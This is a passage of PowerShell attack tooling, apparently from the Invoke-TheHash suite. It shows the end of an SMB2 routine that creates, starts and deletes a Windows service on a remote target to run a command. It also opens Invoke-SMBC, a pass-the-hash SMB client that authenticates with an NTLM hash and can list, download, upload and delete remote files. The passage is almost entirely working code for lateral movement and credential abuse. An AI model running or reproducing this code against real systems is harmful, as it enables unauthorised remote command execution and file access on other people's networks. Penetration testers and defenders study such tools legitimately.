                            $packet_SMB2_header = New-PacketSMB2Header 0x09,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID

                            if($SMB_signing)

                            {

                                $packet_SMB2_header["Flags"] = 0x08,0x00,0x00,0x00      

                            }

                            $SCM_data_middle = $SCM_data[$SMB_split_index_tracker..($SMB_split_index_tracker + $SMB_split_index - 1)]

                            $SMB_split_index_tracker += $SMB_split_index

                            $packet_RPC_data = New-PacketRPCRequest 0x00 0 0 0 0x01,0x00,0x00,0x00 0x00,0x00 0x0c,0x00 $SCM_data_middle

                            $packet_RPC_data["AllocHint"] = [System.BitConverter]::GetBytes($SCM_data.Length - $SMB_split_index_tracker + $SMB_split_index)

                            $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data

                            $packet_SMB2_data = New-PacketSMB2WriteRequest $file_ID $RPC_data.Length

                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header

                            $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data    

                            $RPC_data_length = $SMB2_data.Length + $RPC_data.Length

                            $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $RPC_data_length

                            $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                            if($SMB_signing)

                            {

                                $SMB2_sign = $SMB2_header + $SMB2_data + $RPC_data

                                $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)

                                $SMB2_signature = $SMB2_signature[0..15]

                                $packet_SMB2_header["Signature"] = $SMB2_signature

                                $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header

                            }

                            $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data + $RPC_data

                            $stage = 'SendReceive'

                        }

                        'CreateServiceW_Last'

                        {

                            $stage_current = $stage

                            $message_ID++

                            $packet_SMB2_header = New-PacketSMB2Header 0x09,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID

                            if($SMB_signing)

                            {

                                $packet_SMB2_header["Flags"] = 0x08,0x00,0x00,0x00      

                            }

                            $SCM_data_last = $SCM_data[$SMB_split_index_tracker..$SCM_data.Length]

                            $packet_RPC_data = New-PacketRPCRequest 0x02 0 0 0 0x01,0x00,0x00,0x00 0x00,0x00 0x0c,0x00 $SCM_data_last

                            $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data

                            $packet_SMB2_data = New-PacketSMB2WriteRequest $file_ID $RPC_data.Length

                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header

                            $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data    

                            $RPC_data_length = $SMB2_data.Length + $RPC_data.Length

                            $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $RPC_data_length

                            $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                            if($SMB_signing)

                            {

                                $SMB2_sign = $SMB2_header + $SMB2_data + $RPC_data

                                $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)

                                $SMB2_signature = $SMB2_signature[0..15]

                                $packet_SMB2_header["Signature"] = $SMB2_signature

                                $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header

                            }

                            $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data + $RPC_data

                            $stage = 'SendReceive'

                        }

                        'DeleteServiceW'

                        { 

                            if([System.BitConverter]::ToString($client_receive[108..111]) -eq '1d-04-00-00')

                            {

                                Write-Output "[+] Command executed with service $SMB_service on $Target"

                            }

                            elseif([System.BitConverter]::ToString($client_receive[108..111]) -eq '02-00-00-00')

                            {

                                Write-Output "[-] Service $SMB_service failed to start on $Target"

                            }

                            $stage_current = $stage

                            $message_ID++

                            $packet_SMB2_header = New-PacketSMB2Header 0x09,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID

                            if($SMB_signing)

                            {

                                $packet_SMB2_header["Flags"] = 0x08,0x00,0x00,0x00

                            }

                            $packet_SCM_data = New-PacketSCMDeleteServiceW $SMB_service_context_handle

                            $SCM_data = ConvertFrom-PacketOrderedDictionary $packet_SCM_data

                            $packet_RPC_data = New-PacketRPCRequest 0x03 $SCM_data.Length 0 0 0x01,0x00,0x00,0x00 0x00,0x00 0x02,0x00

                            $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data 

                            $packet_SMB2_data = New-PacketSMB2WriteRequest $file_ID ($RPC_data.Length + $SCM_data.Length)

                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header

                            $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data 

                            $RPC_data_length = $SMB2_data.Length + $SCM_data.Length + $RPC_data.Length

                            $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $RPC_data_length

                            $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                            if($SMB_signing)

                            {

                                $SMB2_sign = $SMB2_header + $SMB2_data + $RPC_data + $SCM_data

                                $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)

                                $SMB2_signature = $SMB2_signature[0..15]

                                $packet_SMB2_header["Signature"] = $SMB2_signature

                                $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header

                            }

                            $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data + $RPC_data + $SCM_data

                            $stage = 'SendReceive'

                        }

                        'Logoff'

                        {

                            $stage_current = $stage

                            $message_ID++

                            $packet_SMB2_header = New-PacketSMB2Header 0x02,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID

                            if($SMB_signing)

                            {

                                $packet_SMB2_header["Flags"] = 0x08,0x00,0x00,0x00      

                            }

                            $packet_SMB2_data = New-PacketSMB2SessionLogoffRequest

                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header

                            $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data

                            $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length

                            $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                            if($SMB_signing)

                            {

                                $SMB2_sign = $SMB2_header + $SMB2_data

                                $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)

                                $SMB2_signature = $SMB2_signature[0..15]

                                $packet_SMB2_header["Signature"] = $SMB2_signature

                                $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header

                            }

                            $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data

                            $stage = 'SendReceive'

                        }

                        'OpenSCManagerW'

                        {

                            $stage_current = $stage

                            $message_ID++

                            $packet_SMB2_header = New-PacketSMB2Header 0x09,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID

                            if($SMB_signing)

                            {

                                $packet_SMB2_header["Flags"] = 0x08,0x00,0x00,0x00      

                            }

                            $packet_SCM_data = New-PacketSCMOpenSCManagerW $SMB_service_bytes $SMB_service_length

                            $SCM_data = ConvertFrom-PacketOrderedDictionary $packet_SCM_data

                            $packet_RPC_data = New-PacketRPCRequest 0x03 $SCM_data.Length 0 0 0x01,0x00,0x00,0x00 0x00,0x00 0x0f,0x00

                            $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data 

                            $packet_SMB2_data = New-PacketSMB2WriteRequest $file_ID ($RPC_data.Length + $SCM_data.Length)

                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header

                            $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data 

                            $RPC_data_length = $SMB2_data.Length + $SCM_data.Length + $RPC_data.Length

                            $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $RPC_data_length

                            $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                            if($SMB_signing)

                            {

                                $SMB2_sign = $SMB2_header + $SMB2_data + $RPC_data + $SCM_data

                                $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)

                                $SMB2_signature = $SMB2_signature[0..15]

                                $packet_SMB2_header["Signature"] = $SMB2_signature

                                $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header

                            }

                            $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data + $RPC_data + $SCM_data

                            $stage = 'SendReceive'

                        }

                        'ReadRequest'

                        {

                            Start-Sleep -m $Sleep

                            $stage_current = $stage

                            $message_ID++

                            $packet_SMB2_header = New-PacketSMB2Header 0x08,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID

                            if($SMB_signing)

                            {

                                $packet_SMB2_header["Flags"] = 0x08,0x00,0x00,0x00      

                            }

                            $packet_SMB2_data = New-PacketSMB2ReadRequest $file_ID

                            $packet_SMB2_data["Length"] = 0xff,0x00,0x00,0x00

                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header

                            $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data 

                            $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length

                            $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                            if($SMB_signing)

                            {

                                $SMB2_sign = $SMB2_header + $SMB2_data 

                                $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)

                                $SMB2_signature = $SMB2_signature[0..15]

                                $packet_SMB2_header["Signature"] = $SMB2_signature

                                $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header

                            }

                            $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data 

                            $stage = 'SendReceive'

                        }

                        'RPCBind'

                        {

                            $stage_current = $stage

                            $SMB_named_pipe_bytes = 0x73,0x00,0x76,0x00,0x63,0x00,0x63,0x00,0x74,0x00,0x6c,0x00 # \svcctl

                            $message_ID++

                            $packet_SMB2_header = New-PacketSMB2Header 0x09,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID

                            if($SMB_signing)

                            {

                                $packet_SMB2_header["Flags"] = 0x08,0x00,0x00,0x00      

                            }

                            $packet_RPC_data = New-PacketRPCBind 0x48,0x00 1 0x01 0x00,0x00 $named_pipe_UUID 0x02,0x00

                            $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data

                            $packet_SMB2_data = New-PacketSMB2WriteRequest $file_ID $RPC_data.Length

                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header

                            $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data 

                            $RPC_data_length = $SMB2_data.Length + $RPC_data.Length

                            $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $RPC_data_length

                            $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                            if($SMB_signing)

                            {

                                $SMB2_sign = $SMB2_header + $SMB2_data + $RPC_data

                                $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)

                                $SMB2_signature = $SMB2_signature[0..15]

                                $packet_SMB2_header["Signature"] = $SMB2_signature

                                $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header

                            }

                            $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data + $RPC_data

                            $stage = 'SendReceive'

                        }

                        'SendReceive'

                        {

                            $client_stream.Write($client_send,0,$client_send.Length) > $null

                            $client_stream.Flush()

                            $client_stream.Read($client_receive,0,$client_receive.Length) > $null

                            if(Get-StatusPending $client_receive[12..15])

                            {

                                $stage = 'StatusPending'

                            }

                            else

                            {

                                $stage = 'StatusReceived'

                            }

                        }

                        'StartServiceW'

                        {

                            if([System.BitConverter]::ToString($client_receive[132..135]) -eq '00-00-00-00')

                            {

                                Write-Verbose "Service $SMB_service created on $Target"

                                $SMB_service_context_handle = $client_receive[112..131]

                                $stage_current = $stage

                                $message_ID++

                                $packet_SMB2_header = New-PacketSMB2Header 0x09,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID

                                if($SMB_signing)

                                {

                                    $packet_SMB2_header["Flags"] = 0x08,0x00,0x00,0x00      

                                }

                                $packet_SCM_data = New-PacketSCMStartServiceW $SMB_service_context_handle

                                $SCM_data = ConvertFrom-PacketOrderedDictionary $packet_SCM_data

                                $packet_RPC_data = New-PacketRPCRequest 0x03 $SCM_data.Length 0 0 0x01,0x00,0x00,0x00 0x00,0x00 0x13,0x00

                                $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data

                                $packet_SMB2_data = New-PacketSMB2WriteRequest $file_ID ($RPC_data.Length + $SCM_data.Length)

                                $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header

                                $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data   

                                $RPC_data_length = $SMB2_data.Length + $SCM_data.Length + $RPC_data.Length

                                $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $RPC_data_length

                                $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                                if($SMB_signing)

                                {

                                    $SMB2_sign = $SMB2_header + $SMB2_data + $RPC_data + $SCM_data

                                    $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)

                                    $SMB2_signature = $SMB2_signature[0..15]

                                    $packet_SMB2_header["Signature"] = $SMB2_signature

                                    $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header

                                }

                                $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data + $RPC_data + $SCM_data

                                Write-Verbose "[*] Trying to execute command on $Target"

                                $stage = 'SendReceive'

                            }

                            elseif([System.BitConverter]::ToString($client_receive[132..135]) -eq '31-04-00-00')

                            {

                                Write-Output "[-] Service $SMB_service creation failed on $Target"

                                $stage = 'Exit'

                            }

                            else

                            {

                                Write-Output "[-] Service creation fault context mismatch"

                                $stage = 'Exit'

                            }

                        }

                        'StatusPending'

                        {

                            $client_stream.Read($client_receive,0,$client_receive.Length) > $null

                            if([System.BitConverter]::ToString($client_receive[12..15]) -ne '03-01-00-00')

                            {

                                $stage = 'StatusReceived'

                            }

                        }

                        'StatusReceived'

                        {

                            switch ($stage_current)

                            {

                                'CloseRequest'

                                {

                                    $stage = 'TreeDisconnect'

                                }

                                'CloseServiceHandle'

                                {

                                    if($SMB_close_service_handle_stage -eq 2)

                                    {

                                        $stage = 'CloseServiceHandle'

                                    }

                                    else

                                    {

                                        $stage = 'CloseRequest'

                                    }

                                }

                                'CreateRequest'

                                {

                                    $file_ID = $client_receive[132..147]

                                    if($Refresh -and $stage -ne 'Exit')

                                    {

                                        Write-Output "[+] Session refreshed"

                                        $stage = 'Exit'

                                    }

                                    elseif($stage -ne 'Exit')

                                    {

                                        $stage = 'RPCBind'

                                    }

                                }

                                'CreateServiceW'

                                {

                                    $stage = 'ReadRequest'

                                    $stage_next = 'StartServiceW'

                                }

                                'CreateServiceW_First'

                                {

                                    if($SMB_split_stage_final -le 2)

                                    {

                                        $stage = 'CreateServiceW_Last'

                                    }

                                    else

                                    {

                                        $SMB_split_stage = 2

                                        $stage = 'CreateServiceW_Middle'

                                    }

                                }

                                'CreateServiceW_Middle'

                                {

                                    if($SMB_split_stage -ge $SMB_split_stage_final)

                                    {

                                        $stage = 'CreateServiceW_Last'

                                    }

                                    else

                                    {

                                        $stage = 'CreateServiceW_Middle'

                                    }

                                }

                                'CreateServiceW_Last'

                                {

                                    $stage = 'ReadRequest'

                                    $stage_next = 'StartServiceW'

                                }

                                'DeleteServiceW'

                                {

                                    $stage = 'ReadRequest'

                                    $stage_next = 'CloseServiceHandle'

                                    $SMB_close_service_handle_stage = 1

                                }

                                'Logoff'

                                {

                                    $stage = 'Exit'

                                }

                                'OpenSCManagerW'

                                {

                                    $stage = 'ReadRequest'

                                    $stage_next = 'CheckAccess' 

                                }

                                'ReadRequest'

                                {

                                    $stage = $stage_next

                                }

                                'RPCBind'

                                {

                                    $stage = 'ReadRequest'

                                    $stage_next = 'OpenSCManagerW'

                                }

                                'StartServiceW'

                                {

                                    $stage = 'ReadRequest'

                                    $stage_next = 'DeleteServiceW'  

                                }

                                'TreeConnect'

                                {

                                    $tree_ID = $client_receive[40..43]

                                    $stage = 'CreateRequest'

                                }

                                'TreeDisconnect'

                                {

                                    if($inveigh_session -and !$Logoff)

                                    {

                                        $stage = 'Exit'

                                    }

                                    else

                                    {

                                        $stage = 'Logoff'

                                    }

                                }

                            }

                        }

                        'TreeConnect'

                        {

                            $tree_ID = $client_receive[40..43]

                            $message_ID++

                            $stage_current = $stage

                            $packet_SMB2_header = New-PacketSMB2Header 0x03,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID

                            if($SMB_signing)

                            {

                                $packet_SMB2_header["Flags"] = 0x08,0x00,0x00,0x00      

                            }

                            $packet_SMB2_data = New-PacketSMB2TreeConnectRequest $SMB_path_bytes

                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header

                            $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data    

                            $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length

                            $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                            if($SMB_signing)

                            {

                                $SMB2_sign = $SMB2_header + $SMB2_data 

                                $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)

                                $SMB2_signature = $SMB2_signature[0..15]

                                $packet_SMB2_header["Signature"] = $SMB2_signature

                                $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header

                            }

                            $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data

                            try

                            {

                                $client_stream.Write($client_send,0,$client_send.Length) > $null

                                $client_stream.Flush()

                                $client_stream.Read($client_receive,0,$client_receive.Length) > $null

                                if(Get-StatusPending $client_receive[12..15])

                                {

                                    $stage = 'StatusPending'

                                }

                                else

                                {

                                    $stage = 'StatusReceived'

                                }

                            }

                            catch

                            {

                                Write-Output "[-] Session connection is closed"

                                $stage = 'Exit'

                            }

                        }

                        'TreeDisconnect'

                        {

                            $stage_current = $stage

                            $message_ID++

                            $packet_SMB2_header = New-PacketSMB2Header 0x04,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID

                            if($SMB_signing)

                            {

                                $packet_SMB2_header["Flags"] = 0x08,0x00,0x00,0x00      

                            }

                            $packet_SMB2_data = New-PacketSMB2TreeDisconnectRequest

                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header

                            $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data

                            $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length

                            $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                            if($SMB_signing)

                            {

                                $SMB2_sign = $SMB2_header + $SMB2_data

                                $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)

                                $SMB2_signature = $SMB2_signature[0..15]

                                $packet_SMB2_header["Signature"] = $SMB2_signature

                                $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header

                            }

                            $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data

                            $stage = 'SendReceive'

                        }

                    }

                }

            }

            catch

            {

                Write-Output "[-] $($_.Exception.Message)"

            }

        }

    }

    if($inveigh_session -and $Inveigh)

    {

        $inveigh.session_lock_table[$session] = 'open'

        $inveigh.session_message_ID_table[$session] = $message_ID

        $inveigh.session[$session] | Where-Object {$_."Last Activity" = Get-Date -format s}

    }

    if(!$inveigh_session -or $Logoff)

    {

        $client.Close()

        $client_stream.Close()

    }

}

}

function Invoke-SMBC

{

[CmdletBinding(DefaultParametersetName='Default')]

param

(

    [parameter(Mandatory=$false)][ValidateSet("List","Recurse","Get","Put","Delete")][String]$Action = "List",

    [parameter(Mandatory=$false)][String]$Destination,

    [parameter(ParameterSetName='Auth',Mandatory=$true)][String]$Username,

    [parameter(ParameterSetName='Auth',Mandatory=$false)][String]$Domain,

    [parameter(Mandatory=$true)][Object]$Source,

    [parameter(ParameterSetName='Auth',Mandatory=$true)][ValidateScript({$_.Length -eq 32 -or $_.Length -eq 65})][String]$Hash,

    [parameter(Mandatory=$false)][Switch]$Modify,

    [parameter(Mandatory=$false)][Switch]$NoProgress,

    [parameter(Mandatory=$false)][ValidateSet("Auto","1","2.1")][String]$Version="Auto",

    [parameter(ParameterSetName='Session',Mandatory=$false)][Int]$Session,

    [parameter(ParameterSetName='Session',Mandatory=$false)][Switch]$Logoff,

    [parameter(ParameterSetName='Session',Mandatory=$false)][Switch]$Refresh,

    [parameter(Mandatory=$false)][Int]$Sleep=100

)

if($Version -eq '1')

{

    $SMB_version = 'SMB1'

}

elseif($Version -eq '2.1')

{

    $SMB_version = 'SMB2.1'

}

if($PsCmdlet.ParameterSetName -ne 'Auth' -and $PsCmdlet.ParameterSetName -ne 'Session')

{

    $signing_check = $true

}

function ConvertFrom-PacketOrderedDictionary

{

    param($ordered_dictionary)

    ForEach($field in $ordered_dictionary.Values)

    {

        $byte_array += $field

    }

    return $byte_array

}

#NetBIOS

function New-PacketNetBIOSSessionService

{

    param([Int]$HeaderLength,[Int]$DataLength)

    [Byte[]]$length = ([System.BitConverter]::GetBytes($HeaderLength + $DataLength))[2..0]

    $NetBIOSSessionService = New-Object System.Collections.Specialized.OrderedDictionary

    $NetBIOSSessionService.Add("MessageType",[Byte[]](0x00))

    $NetBIOSSessionService.Add("Length",$length)

    return $NetBIOSSessionService

}

#SMB1

function New-PacketSMBHeader

{

    param([Byte[]]$Command,[Byte[]]$Flags,[Byte[]]$Flags2,[Byte[]]$TreeID,[Byte[]]$ProcessID,[Byte[]]$UserID)

    $ProcessID = $ProcessID[0,1]

    $SMBHeader = New-Object System.Collections.Specialized.OrderedDictionary

    $SMBHeader.Add("Protocol",[Byte[]](0xff,0x53,0x4d,0x42))

    $SMBHeader.Add("Command",$Command)

    $SMBHeader.Add("ErrorClass",[Byte[]](0x00))

    $SMBHeader.Add("Reserved",[Byte[]](0x00))

    $SMBHeader.Add("ErrorCode",[Byte[]](0x00,0x00))

    $SMBHeader.Add("Flags",$Flags)

    $SMBHeader.Add("Flags2",$Flags2)

    $SMBHeader.Add("ProcessIDHigh",[Byte[]](0x00,0x00))

    $SMBHeader.Add("Signature",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))

    $SMBHeader.Add("Reserved2",[Byte[]](0x00,0x00))

    $SMBHeader.Add("TreeID",$TreeID)

    $SMBHeader.Add("ProcessID",$ProcessID)

    $SMBHeader.Add("UserID",$UserID)

    $SMBHeader.Add("MultiplexID",[Byte[]](0x00,0x00))

    return $SMBHeader

}

function New-PacketSMBNegotiateProtocolRequest

{

    param([String]$Version)

    if($version -eq 'SMB1')

    {

        [Byte[]]$byte_count = 0x0c,0x00

    }

    else

    {

        [Byte[]]$byte_count = 0x22,0x00  

    }

    $SMBNegotiateProtocolRequest = New-Object System.Collections.Specialized.OrderedDictionary

    $SMBNegotiateProtocolRequest.Add("WordCount",[Byte[]](0x00))

    $SMBNegotiateProtocolRequest.Add("ByteCount",$byte_count)

    $SMBNegotiateProtocolRequest.Add("RequestedDialects_Dialect_BufferFormat",[Byte[]](0x02))

    $SMBNegotiateProtocolRequest.Add("RequestedDialects_Dialect_Name",[Byte[]](0x4e,0x54,0x20,0x4c,0x4d,0x20,0x30,0x2e,0x31,0x32,0x00))

    if($version -ne 'SMB1')

    {

        $SMBNegotiateProtocolRequest.Add("RequestedDialects_Dialect_BufferFormat2",[Byte[]](0x02))

        $SMBNegotiateProtocolRequest.Add("RequestedDialects_Dialect_Name2",[Byte[]](0x53,0x4d,0x42,0x20,0x32,0x2e,0x30,0x30,0x32,0x00))

        $SMBNegotiateProtocolRequest.Add("RequestedDialects_Dialect_BufferFormat3",[Byte[]](0x02))

        $SMBNegotiateProtocolRequest.Add("RequestedDialects_Dialect_Name3",[Byte[]](0x53,0x4d,0x42,0x20,0x32,0x2e,0x3f,0x3f,0x3f,0x00))

    }

    return $SMBNegotiateProtocolRequest

}

function New-PacketSMBSessionSetupAndXRequest

{

    param([Byte[]]$SecurityBlob)

    [Byte[]]$byte_count = [System.BitConverter]::GetBytes($SecurityBlob.Length)[0,1]

    [Byte[]]$security_blob_length = [System.BitConverter]::GetBytes($SecurityBlob.Length + 5)[0,1]

    $SMBSessionSetupAndXRequest = New-Object System.Collections.Specialized.OrderedDictionary

    $SMBSessionSetupAndXRequest.Add("WordCount",[Byte[]](0x0c))

    $SMBSessionSetupAndXRequest.Add("AndXCommand",[Byte[]](0xff))

    $SMBSessionSetupAndXRequest.Add("Reserved",[Byte[]](0x00))

    $SMBSessionSetupAndXRequest.Add("AndXOffset",[Byte[]](0x00,0x00))

    $SMBSessionSetupAndXRequest.Add("MaxBuffer",[Byte[]](0xff,0xff))

    $SMBSessionSetupAndXRequest.Add("MaxMpxCount",[Byte[]](0x02,0x00))

    $SMBSessionSetupAndXRequest.Add("VCNumber",[Byte[]](0x01,0x00))

    $SMBSessionSetupAndXRequest.Add("SessionKey",[Byte[]](0x00,0x00,0x00,0x00))

    $SMBSessionSetupAndXRequest.Add("SecurityBlobLength",$byte_count)

    $SMBSessionSetupAndXRequest.Add("Reserved2",[Byte[]](0x00,0x00,0x00,0x00))

    $SMBSessionSetupAndXRequest.Add("Capabilities",[Byte[]](0x44,0x00,0x00,0x80))

    $SMBSessionSetupAndXRequest.Add("ByteCount",$security_blob_length)

    $SMBSessionSetupAndXRequest.Add("SecurityBlob",$SecurityBlob)

    $SMBSessionSetupAndXRequest.Add("NativeOS",[Byte[]](0x00,0x00,0x00))

    $SMBSessionSetupAndXRequest.Add("NativeLANManage",[Byte[]](0x00,0x00))

    return $SMBSessionSetupAndXRequest 

}

#SMB2

function New-PacketSMB2Header

{

    param([Byte[]]$Command,[Byte[]]$CreditRequest,[Bool]$Signing,[Int]$MessageID,[Byte[]]$ProcessID,[Byte[]]$TreeID,[Byte[]]$SessionID)

    if($Signing)

    {

        $flags = 0x08,0x00,0x00,0x00      

    }

    else

    {

        $flags = 0x00,0x00,0x00,0x00

    }

    [Byte[]]$message_ID = [System.BitConverter]::GetBytes($MessageID)

    if($message_ID.Length -eq 4)

    {

        $message_ID += 0x00,0x00,0x00,0x00

    }

    $SMB2Header = New-Object System.Collections.Specialized.OrderedDictionary

    $SMB2Header.Add("ProtocolID",[Byte[]](0xfe,0x53,0x4d,0x42))

    $SMB2Header.Add("StructureSize",[Byte[]](0x40,0x00))

    $SMB2Header.Add("CreditCharge",[Byte[]](0x01,0x00))

    $SMB2Header.Add("ChannelSequence",[Byte[]](0x00,0x00))

    $SMB2Header.Add("Reserved",[Byte[]](0x00,0x00))

    $SMB2Header.Add("Command",$Command)

    $SMB2Header.Add("CreditRequest",$CreditRequest)

    $SMB2Header.Add("Flags",$flags)

    $SMB2Header.Add("NextCommand",[Byte[]](0x00,0x00,0x00,0x00))

    $SMB2Header.Add("MessageID",$message_ID)

    $SMB2Header.Add("ProcessID",$ProcessID)

    $SMB2Header.Add("TreeID",$TreeID)

    $SMB2Header.Add("SessionID",$SessionID)

    $SMB2Header.Add("Signature",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))

    return $SMB2Header

}

function New-PacketSMB2NegotiateProtocolRequest

{

    $SMB2NegotiateProtocolRequest = New-Object System.Collections.Specialized.OrderedDictionary

    $SMB2NegotiateProtocolRequest.Add("StructureSize",[Byte[]](0x24,0x00))

    $SMB2NegotiateProtocolRequest.Add("DialectCount",[Byte[]](0x02,0x00))

    $SMB2NegotiateProtocolRequest.Add("SecurityMode",[Byte[]](0x01,0x00))

    $SMB2NegotiateProtocolRequest.Add("Reserved",[Byte[]](0x00,0x00))

    $SMB2NegotiateProtocolRequest.Add("Capabilities",[Byte[]](0x40,0x00,0x00,0x00))

    $SMB2NegotiateProtocolRequest.Add("ClientGUID",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))

    $SMB2NegotiateProtocolRequest.Add("NegotiateContextOffset",[Byte[]](0x00,0x00,0x00,0x00))

    $SMB2NegotiateProtocolRequest.Add("NegotiateContextCount",[Byte[]](0x00,0x00))

    $SMB2NegotiateProtocolRequest.Add("Reserved2",[Byte[]](0x00,0x00))

    $SMB2NegotiateProtocolRequest.Add("Dialect",[Byte[]](0x02,0x02))

    $SMB2NegotiateProtocolRequest.Add("Dialect2",[Byte[]](0x10,0x02))

    return $SMB2NegotiateProtocolRequest

}

function New-PacketSMB2SessionSetupRequest

{

    param([Byte[]]$SecurityBlob)

    [Byte[]]$security_buffer_length = ([System.BitConverter]::GetBytes($SecurityBlob.Length))[0,1]

    $SMB2SessionSetupRequest = New-Object System.Collections.Specialized.OrderedDictionary

    $SMB2SessionSetupRequest.Add("StructureSize",[Byte[]](0x19,0x00))

    $SMB2SessionSetupRequest.Add("Flags",[Byte[]](0x00))

    $SMB2SessionSetupRequest.Add("SecurityMode",[Byte[]](0x01))

    $SMB2SessionSetupRequest.Add("Capabilities",[Byte[]](0x00,0x00,0x00,0x00))

    $SMB2SessionSetupRequest.Add("Channel",[Byte[]](0x00,0x00,0x00,0x00))

    $SMB2SessionSetupRequest.Add("SecurityBufferOffset",[Byte[]](0x58,0x00))

